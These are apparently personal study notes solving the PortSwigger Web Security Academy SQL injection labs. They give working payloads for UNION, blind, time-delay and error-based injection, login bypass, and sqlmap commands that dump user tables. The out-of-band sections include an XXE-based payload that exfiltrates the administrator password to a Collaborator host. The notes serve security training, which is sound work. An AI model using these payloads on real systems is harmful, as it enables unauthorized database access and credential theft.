```ad-danger
USE THIS SQLMAP SETTINGS
~~~
sqlmap -r mistery.txt -p category --level=3 --dump --proxy=http://127.0.0.1:8080 --force-ssl
~~~
```
## Table of Contents

- [[#SQL injection UNION attack, determining the number of columns returned by the query]]
- [[#SQL injection UNION attack, finding a column containing text]]
- [[#SQL injection UNION attack, retrieving data from other tables]]
- [[#SQL injection UNION attack, retrieving multiple values in a single column]]
- [[#SQL injection attack, querying the database type and version on Oracle]]
- [[#SQL injection attack, querying the database type and version on MySQL and Microsoft]]
- [[#SQL injection attack, listing the database contents on non-Oracle databases]]
- [[#SQL injection attack, listing the database contents on Oracle]]
- [[#Blind SQL injection with conditional responses]]
- [[#Blind SQL injection with conditional errors]]
- [[#Blind SQL injection with time delays]]
- [[#Blind SQL injection with time delays and information retrieval]]
- [[#Blind SQL injection with out-of-band interaction]]
- [[#Blind SQL injection with out-of-band data exfiltration]]
- [[#SQL injection vulnerability in WHERE clause allowing retrieval of hidden data]]
- [[#Lab: SQL injection vulnerability allowing login bypass]]
- [[#Visible error-based SQL injection]]

## SQL injection UNION attack, determining the number of columns returned by the query
Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

```ad-hint
title: Quick Solution
The ``category`` parameter is vulnerable to SQL Injection, use a **UNION** attack to retrieve the number of columns, the payload is simply:

### Keep adding NULL until the error disappears
~~~
'+UNION+SELECT+NULL,NULL--
~~~
```

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the ``category`` parameter, giving it the value ``'+UNION+SELECT+NULL--``. Observe that an error occurs.
3. Modify the category parameter to add an additional column containing a null value: 
~~~
'+UNION+SELECT+NULL,NULL--
~~~
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.
```

## SQL injection UNION attack, finding a column containing text
Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

```ad-hint
title: Quick Solution
The ``category`` parameter is vulnerable to SQL Injection, combine the previous payload to retrieve the number of columns and then change the ``NULL`` value one by one with a random string to find a column that contains text. Payload in the next section
```

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the ``category`` parameter: 
~~~
'+UNION+SELECT+NULL,NULL,NULL--
~~~
3. Try replacing each null with the random value provided by the lab, for example: 
~~~
'+UNION+SELECT+'abcdef',NULL,NULL--
~~~
4. If an error occurs, move on to the next null and try that instead.
```

## SQL injection UNION attack, retrieving data from other tables
Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

```ad-hint
title: Quick Solution
Use the previous payloads to retrieve the number of columns and which columns contain text data. The description says that there is a ``users`` table with columns called ``username`` and ``password``. Use the following payload to retrieve the contents of ``users`` table:
~~~
'+UNION+SELECT+username,+password+FROM+users--
~~~
```

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: 
~~~
'+UNION+SELECT+'abc','def'--.
~~~
3. Use the following payload to retrieve the contents of the users table: 
~~~
'+UNION+SELECT+username,+password+FROM+users--
~~~
4. Verify that the application's response contains usernames and passwords.
```

## SQL injection UNION attack, retrieving multiple values in a single column
Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

```ad-hint
title: Quick Solution
The original query returns two colums, but only one contains text. Multiple values can be retrieved together including a suitable separator to let distinguish the combined values. The payload for this lab is the following:
~~~
' UNION SELECT username || '~' || password FROM users--
~~~
```

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the ``category`` parameter: 
~~~
'+UNION+SELECT+NULL,'abc'--
~~~
3. Use the following payload to retrieve the contents of the users table: 
~~~
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
~~~
4. Verify that the application's response contains usernames and passwords.
```

## SQL injection attack, querying the database type and version on Oracle
Reference: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

```ad-hint
title: Quick Solution
Be aware that on Oracle databases every ``SELECT`` statement must specify a table to select ``FROM``. There is a built-in table on Oracle called ``dual`` which can be used for this purpose. After retrieving the number of columns and which column contains data the SQL Injection cheatsheet can be used to discover how to retrieve the version on Oracle databases. The payload is the following:
~~~
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
~~~
```

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: 
~~~
'+UNION+SELECT+'abc','def'+FROM+dual--
~~~
3. Use the following payload to display the database version: 
~~~
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
~~~
```

## SQL injection attack, querying the database type and version on MySQL and Microsoft
Reference: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

```ad-hint
title: Quick Solution
This lab is similar to the ones before. The only difference is that it is mandatory to use Burp because seems impossible to inject the '#' character from the browser. The final payload is the following:
~~~
'+UNION+SELECT+@@version,+NULL#
~~~
```

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the ``category`` parameter: 
~~~
'+UNION+SELECT+'abc','def'#
~~~
3. Use the following payload to display the database version: 
~~~
'+UNION+SELECT+@@version,+NULL#
~~~
```

## SQL injection attack, listing the database contents on non-Oracle databases
Reference: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

```ad-hint
title: Quick Solution
In this case a full attack must be completed. For this reason I used a tool to automate it: ``sqlmap``. To retrieve the credentials of the ``administrator`` I used the the following commands (I used the Dockerized version of ``sqlmap``):

### Get Databases
~~~
docker run -it --rm secsi/sqlmap -u "<target_url>" --dbs
~~~
### List tables in database
~~~
docker run -it --rm secsi/sqlmap -u "<target_url>" -D public --tables
~~~
### Dump content of a DB table
~~~
docker run -it --rm secsi/sqlmap -u "<target_url>" -D public -T <users_table_name> --dump
~~~
```

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the ``category`` parameter: 
~~~
'+UNION+SELECT+'abc','def'--.
~~~
3. Use the following payload to retrieve the list of tables in the database:
~~~
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
~~~
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table: 
~~~
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
~~~
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
~~~
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
~~~
8. Find the password for the ``administrator`` user, and use it to log in.
```

## SQL injection attack, listing the database contents on Oracle
Reference: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

```ad-hint
title: Quick Solution
The same applies for this lab with a little difference: ``Oracle`` DBMS is a little bit different when it comes to databases. So I used this commands:

### Get Tables
~~~
docker run -it --rm secsi/sqlmap -u "<target_url>" --tables
~~~
### Then I found the target table and runned
~~~
docker run -it --rm secsi/sqlmap -u "<target_url>" -T <users_table_name> --dump
~~~
```

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the ``category`` parameter:
~~~
'+UNION+SELECT+'abc','def'+FROM+dual--
~~~
3. Use the following payload to retrieve the list of tables in the database:
~~~
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
~~~
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table: 
~~~
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
~~~
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
~~~
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
~~~
8. Find the password for the ``administrator`` user, and use it to log in.
```

## Blind SQL injection with conditional responses
Reference: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

```ad-hint
title: Quick Solution
This time the SQL Injections resides in the ``TrackingId`` cookie. For this reason a different ``sqlmap`` command must be used:

### Detect tables
~~~
docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 --tables
~~~
### Dump the content of 'users' table (set DBMS to speed up the execution)
~~~
docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 -T users --dbms=postgresql --dump
~~~
```

```ad-done
title: Solution
The solution is **extremely long** and it has not been copied, see the reference link.
```

## Blind SQL injection with conditional errors
Reference: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

```ad-hint
title: Quick Solution
In this case the Database is Oracle. It is impossible to use either ``ALL_TABLES`` and ``ALL_TAB_COLUMNS`` to retrieve Database content. For this reason there are two alternative:
- Infer the existence of a ``users`` table
- Blindly detect all the table in the ``SYSTEM`` Database

Here is the code for both of them: 

### Blindly detect all the tables in the SYSTEM database
~~~
docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 --dump
~~~
### Dump the content of the users table
~~~
docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 -T users --dump
~~~
```

```ad-done
title: Solution
The solution is **extremely long** and it has not been copied, see the reference link.
```

## Blind SQL injection with time delays
Reference: https://acd71f421faa06c4c0601db1008a000e.web-security-academy.net/

```ad-hint
title: Quick Solution
For this lab it is only needed to observe that the DB is vulnerable to SQL injection with time delay, see the solution in the next section.            
```

```ad-done
title: Solution
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
2. Modify the TrackingId cookie, changing it to: 
~~~
TrackingId=x'||pg_sleep(10)--
~~~
3. Submit the request and observe that the application takes 10 seconds to respond.
```

## Blind SQL injection with time delays and information retrieval
Reference: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

```ad-hint
title: Quick Solution
As in the previous lab the Database is vulnerable to **SQL Injection with time delays**. We can use the following commands to exploit the lab:

### Enumerate tables
~~~
docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 --dump
~~~
### Dump the content of the users table
~~~
docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 -T users --dump
~~~
```

```ad-done
title: Solution
The solution is **extremely long** and it has not been copied, see the reference link.
```

## Blind SQL injection with out-of-band interaction
Reference: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

```ad-hint
title: Quick Solution
This lab contains a blind SQL Injection vulnerability that has **no effect on the application's response**. For this reason an out-of-band interaction with an external domain must be triggered. I tried to use the ``--dns-domain`` option of ``sqlmap`` but it doesn't seems to work. That's probably because of my machine setup (Burp on WSL2 and sqlmap dockerized). For this lab skip to the solution.
```

```ad-done
title: Solution
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the ``TrackingId`` cookie.
2. Modify the ``TrackingId`` cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows: 
~~~
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--.
~~~
The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator client to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab.
```

## Blind SQL injection with out-of-band data exfiltration
Reference: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

```ad-hint
title: Quick Solution
This lab contains a blind SQL Injection vulnerability that has **no effect on the application's response**. For this reason an out-of-band interaction with an external domain must be triggered. I tried to use the ``--dns-domain`` option of ``sqlmap`` but it doesn't seems to work. That's probably because of my machine setup (Burp on WSL2 and sqlmap dockerized). For this lab skip to the solution.
```

```ad-done
title: Solution
1. Visit the front page of the shop, and use Burp Suite Professional to intercept and modify the request containing the ``TrackingId`` cookie.
2. Go to the Burp menu, and launch the Burp Collaborator client.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
4. Modify the ``TrackingId`` cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows: 
~~~
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
~~~
5. Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.
6. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the ``administrator`` user should appear in the subdomain of the interaction, and you can view this within the Burp Collaborator client. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.
7. In your browser, click "My account" to open the login page. Use the password to log in as the ``administrator`` user.
```

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Reference: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

```ad-hint
title: Quick Solution
In this lab the payload is quite easy, the goal is to retrieve hidden items. See next section for the solution.
```

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the ``category`` parameter, giving it the value ``'+OR+1=1--``
3. Submit the request, and verify that the response now contains additional items.
```

## Lab: SQL injection vulnerability allowing login bypass
Reference: https://portswigger.net/web-security/sql-injection/lab-login-bypass

```ad-hint
title: Quick Solution
In this lab the payload is quite easy, the goal is to login as 
~~~
administrator
~~~
. See next section for the solution.
```

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify the login request.
2. Modify the ``username`` parameter, giving it the value: 
~~~
administrator'--
~~~
```

## Visible error-based SQL injection
Reference: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

```ad-done
title: Solution
1. Using Burp's built-in browser, explore the lab functionality.
2. Go to the **Proxy > HTTP history** tab and find a `GET /` request that contains a `TrackingId` cookie.
3. In Repeater, append a single quote to the value of your `TrackingId` cookie and send the request.
    
    ~~~
    TrackingId=ogAZZfxtOKUELbuJ'
    ~~~
1. In the response, notice the verbose error message. This discloses the full SQL query, including the value of your cookie. It also explains that you have an unclosed string literal. Observe that your injection appears inside a single-quoted string.
2. In the request, add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error:
    
    ~~~
    TrackingId=ogAZZfxtOKUELbuJ'--
    ~~~
1. Send the request. Confirm that you no longer receive an error. This suggests that the query is now syntactically valid.
2. Adapt the query to include a generic `SELECT` subquery and cast the returned value to an `int` data type:
    
    ~~~
    TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
    ~~~
1. Send the request. Observe that you now get a different error saying that an `AND` condition must be a boolean expression.
2. Modify the condition accordingly. For example, you can simply add a comparison operator (`=`) as follows:
    
    ~~~
    TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
    ~~~
1. Send the request. Confirm that you no longer receive an error. This suggests that this is a valid query again.
2. Adapt your generic `SELECT` statement so that it retrieves usernames from the database:
    
    ~~~
    TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
    ~~~
1. Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.
2. Delete the original value of the `TrackingId` cookie to free up some additional characters. Resend the request.
    
    ~~~
    TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
    ~~~
1. Notice that you receive a new error message, which appears to be generated by the database. This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.
2. Modify the query to return only one row:
    
    ~~~
    TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
    ~~~
1. Send the request. Observe that the error message now leaks the first username from the `users` table:
    
    ~~~
    ERROR: invalid input syntax for type integer: "administrator"
    ~~~
1. Now that you know that the `administrator` is the first user in the table, modify the query once again to leak their password:
    
    ~~~
    TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
    ~~~
1. Log in as `administrator` using the stolen password to solve the lab.
```
